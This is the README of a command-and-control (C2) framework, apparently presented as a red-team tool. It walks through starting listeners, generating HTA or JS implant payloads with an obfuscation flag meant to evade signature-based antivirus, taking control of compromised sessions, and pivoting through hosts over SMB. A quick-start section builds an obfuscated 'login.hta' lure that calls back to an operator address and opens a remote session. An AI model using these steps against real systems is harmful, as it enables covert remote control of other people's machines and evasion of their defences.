Hey, welcome to the mTLS C2 Framework.

This is a lightweight tool I built for red teaming. The focus here is simple: stay quiet and stay secure. By using Mutual TLS (mTLS), we make sure that only your agents can talk to your server, and vice versa. No unauthorized scans or hijacking.

1. Setting up Listeners

Listeners are your entry points. You can spin up HTTP, HTTPS, or raw TCP. If you're going for stealth, HTTPS is your best friend because it looks like normal web traffic.

Command What it does
mtls list Shows you what's currently running.
mtls <type> <host> <port> Starts a new listener.

2. Generating Payloads

The framework generates HTA or JS files. The cool part? You can use --obfuscate to mess with the code structure so it doesn't get flagged by signature-based AV.

generate 192.168.1.10 443 setup.hta --obfuscate --sleep 30 10

3. Managing Sessions

Once your payload hits, the agent will check back in based on your jitter settings. You can jump in and out of sessions without losing your place.

  • sessions: See who's online.
  • interact <id>: Take control.
  • background: Head back to the main menu.

4. Networking & Pivoting

If you've hit a box that can't see the internet, you can use SMB daisy-chaining. This lets you tunnel traffic through a "beachhead" agent that can see you.

Quick Start Summary

If you just want to get moving, do this:

  1. Start your listener: mtls https 192.168.1.10 443
  2. Make your HTA: generate 192.168.1.10 443 login.hta --obfuscate
  3. Wait for the hit, then: interact 1
